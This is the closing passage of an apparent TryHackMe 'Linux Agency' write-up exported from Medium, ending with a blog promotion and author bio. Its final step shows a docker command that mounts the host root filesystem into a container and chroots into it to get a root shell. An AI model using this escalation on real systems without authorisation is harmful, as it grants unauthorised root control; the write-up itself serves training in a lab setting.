data-width="496" data-height="195" />
</figure>

**What is root.txt?**

We check users on the system but mission users and others don't appear:

``` {#b1e1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./docker ps -a
./docker image ls
./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
```

<figure id="b619" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*zq_C-Q5kayg0vX7m.png"
class="graf-image" data-image-id="0*zq_C-Q5kayg0vX7m.png"
data-width="875" data-height="279" />
</figure>

<figure id="1121" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*MfUGv-j9Yjb4hen5.png"
class="graf-image" data-image-id="0*MfUGv-j9Yjb4hen5.png"
data-width="415" data-height="137" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#943c .graf .graf--h3 .graf-after--figure name="943c"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#1f2a .graf .graf--h3 .graf-after--p name="1f2a"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 5, 2024](https://medium.com/p/ef9cf80d221a).

[Canonical
link](https://medium.com/@bevijaygupta/linux-agency-tryhackme-writeup-ef9cf80d221a){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
